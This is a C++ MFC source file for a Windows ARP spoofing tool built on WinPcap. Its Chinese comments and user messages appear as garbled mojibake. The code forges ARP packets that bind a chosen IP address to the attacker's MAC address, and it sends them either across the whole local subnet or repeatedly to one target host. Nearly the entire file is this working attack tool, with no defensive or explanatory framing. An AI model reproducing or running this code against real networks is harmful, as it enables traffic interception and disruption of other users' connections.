
// arpcDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "arpc.h"
#include "arpcDlg.h"
#include "afxdialogex.h"
#include "pcap.h"
#include <conio.h>
#include <packet32.h>
#include <ntddndis.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

pcap_if_t *alldevs; //ȫ�������б�
pcap_if_t *d; //һ������
int inum; //�û�ѡ����������
int i=0; //ѭ������
pcap_t *adhandle; //һ��pcapʵ��
char errbuf[PCAP_ERRBUF_SIZE]; //���󻺳���
unsigned char *mac; //����MAC��ַ
unsigned char *packet; //ARP��
unsigned long fakeIp; //Ҫαװ�ɵ�IP��ַ
unsigned long aimIp;//Ҫ������IP��ַ
pcap_addr_t *pAddr; //������ַ
unsigned long ip; //IP��ַ
unsigned long netmask; //��������
int flag=0;
u_char destinationMac[6];//Ŀ��mac
char aimip[16];
// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CarpcDlg �Ի���




CarpcDlg::CarpcDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CarpcDlg::IDD, pParent)
	, m_edit(_T(""))
	
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CarpcDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_COMBO1, m_combo);
	DDX_Text(pDX, IDC_EDIT1, m_edit);
	DDX_Control(pDX, IDC_EDIT1, m_edit2);
	DDX_Control(pDX, IDC_EDIT2, m_edit3);
	//DDX_Control(pDX, IDC_RADIO1, ratio1);
	//DDX_Control(pDX, IDC_BUTTON2, button);
	//DDX_Control(pDX, IDC_EDIT2, m_edit3);
	DDX_Control(pDX, IDC_RADIO1, ratio);
}

BEGIN_MESSAGE_MAP(CarpcDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &CarpcDlg::OnBnClickedButton1)
END_MESSAGE_MAP()


// CarpcDlg ��Ϣ�������

BOOL CarpcDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	CString strmid;
	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������



	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}
	
	/* ��ӡ�����б� */
	for(d=alldevs; d; d=d->next)
	{
		if (d->description)
		{
			strmid=d->description;
			m_combo.AddString(strmid);
		}
	}

	ratio.SetCheck(TRUE);

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CarpcDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CarpcDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CarpcDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

/*--------------------------------�԰����з�װ-----------------------*/
void packetEncap(u_char p[]){//��װ�������ṹ���еĶ���0λ
	memcpy(p,packet,14);
	memcpy(p+14,packet+16,14);
	memcpy(p+14+14,packet+16+16,10);
	memcpy(p+14+14+10,packet+16+16+12,4);
	memset(p+42,0,18);
}


/*-----------------------------�����ݰ����н���-----------------------------------------*/

void CarpcDlg::OnBnClickedButton1()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	CString s1;
	m_edit2.GetWindowTextW(s1);
	if(s1.GetLength()==0)
	{
		MessageBox(_T("������IP"));
		return;
	}
	char sss[16];
	sprintf(sss,"%S",s1);
	fakeIp=inet_addr(sss);
	inum=m_combo.GetCurSel();
	for(d=alldevs, i=0; i< inum ;d=d->next, i++);
	mac = GetSelfMac(d->name+8); //+8��ȥ��"rpcap://"
	if ( (adhandle= pcap_open(d->name, // name of the device
			65536, // portion of the packet to capture
			0, //open flag
			1000, // read timeout
			NULL, // authentication on the remote machine
			errbuf // error buffer
		) ) == NULL)
	{
		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n",d->name); 
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return ;
	}
	for(pAddr=d->addresses; pAddr; pAddr=pAddr->next)
	{
		//�õ��û�ѡ���������һ��IP��ַ
		ip = ((struct sockaddr_in *)pAddr->addr)->sin_addr.s_addr;
		//�õ���IP��ַ��Ӧ����������
		netmask = ((struct sockaddr_in *)(pAddr->netmask))->sin_addr.S_un.S_addr;
		if (!ip || !netmask)
		{
			continue;
		}
		//�������IP��Ҫαװ��IP�Ƿ���ͬһ������
		if((ip&netmask)!=(fakeIp&netmask))
		{
		continue; //�������һ������������������ַ�б�
		}
	}
	
	if(ratio.GetCheck()==TRUE)
	{
		
		unsigned long netsize = ntohl(~netmask); //������������
		unsigned long net = ip & netmask; //������ַ
		for(unsigned long n=1; n<netsize; n++)
		{
			//��į������IP��ַ�������ֽ�˳��
			unsigned long destIp = net | htonl(n);
			//�����ٵ�ARP��������ﵽ����αװ�ɸ�����IP��ַ��Ŀ��
			packet = BuildArpPacket(mac,fakeIp,destIp);
			if(pcap_sendpacket(adhandle, packet, 60)==-1)
			{
				fprintf(stderr,"pcap_sendpacket error.\n");
			}
			
		}
		MessageBox(_T("�ɹ����о������㲥������"));
	}
	else
	{
		CString s2;
		m_edit3.GetWindowTextW(s2);
		if(s2.GetLength()==0)
		{
		MessageBox(_T("������Ŀ��IP"));
		return;
		}
		
		sprintf(aimip,"%S",s2);
		aimIp=inet_addr(aimip);
		if((ip&netmask)!=(aimIp&netmask))
		{
			MessageBox(_T("����ͬһ�����Σ��޷���ƭ\n"));
			return;
		}
		packet = BuildArpPacket(mac,fakeIp,aimIp);
		while(flag!=20)
		{
			if(pcap_sendpacket(adhandle, packet, 60)==-1)
			{
				{
					fprintf(stderr,"pcap_sendpacket error.\n");
				}
			}
			flag++;
		}
		MessageBox(_T("�ɹ����е�һĿ�깥��!"));			
	}	
}
/** 
* ���������MAC��ַ 
* pDevName �������豸���� 
*/
unsigned char* GetSelfMac(char* pDevName)
{
	static u_char mac[6];
	memset(mac,0,sizeof(mac));
	LPADAPTER lpAdapter = PacketOpenAdapter(pDevName);
	if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE)) 
	{
		return NULL;
	}
	PPACKET_OID_DATA OidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA));
	if (OidData == NULL) 
	{
		PacketCloseAdapter(lpAdapter);
		return NULL;
	} 
	// 
	// Retrieve the adapter MAC querying the NIC driver 
	//
	OidData->Oid = OID_802_3_CURRENT_ADDRESS;
	OidData->Length = 6;
	memset(OidData->Data, 0, 6);
	BOOLEAN Status = PacketRequest(lpAdapter, FALSE, OidData);
	if(Status) 
	{
		memcpy(mac,(u_char*)(OidData->Data),6); 
	}free(OidData); 
	PacketCloseAdapter(lpAdapter); 
	return mac; 
	
} 

/** 
* ��װARP����� 
* source_mac ԴMAC��ַ 
* srcIP ԴIP 
* destIP Ŀ��IP 
*/ 
unsigned char* BuildArpPacket(unsigned char* source_mac, 
							  unsigned long srcIP,unsigned long destIP) 
{ 
	static struct arp_packet packet; 
	
	//Ŀ��MAC��ַΪ�㲥��ַ��FF-FF-FF-FF-FF-FF 
	memset(packet.eth.dest_mac,0xFF,6); 
	//ԴMAC��ַ 
	memcpy(packet.eth.source_mac,source_mac,6); 
	//�ϲ�Э��ΪARPЭ�飬0x0806 
	packet.eth.eh_type = htons(0x0806); 
	
	//Ӳ�����ͣ�Ethernet��0x0001 
	packet.arp.hardware_type = htons(0x0001); 
	//�ϲ�Э�����ͣ�IPΪ0x0800 
	packet.arp.protocol_type = htons(0x0800); 
	//Ӳ����ַ���ȣ�MAC��ַ����Ϊ0x06 
	packet.arp.add_len = 0x06; 
	//Э���ַ���ȣ�IP��ַ����Ϊ0x04 
	packet.arp.pro_len = 0x04; 
	//������ARP����Ϊ1 
	packet.arp.option = htons(0x0001); 
	//ԴMAC��ַ 
	memcpy(packet.arp.sour_addr,source_mac,6); 
	//ԴIP��ַ 
	packet.arp.sour_ip = srcIP; 
	//Ŀ��MAC��ַ�����0 
	memset(packet.arp.dest_addr,0,6); 
	//Ŀ��IP��ַ 
	packet.arp.dest_ip = destIP; 
	//������ݣ�18B 
	memset(packet.arp.padding,0,18); 
	
	return (unsigned char*)&packet; 
} 
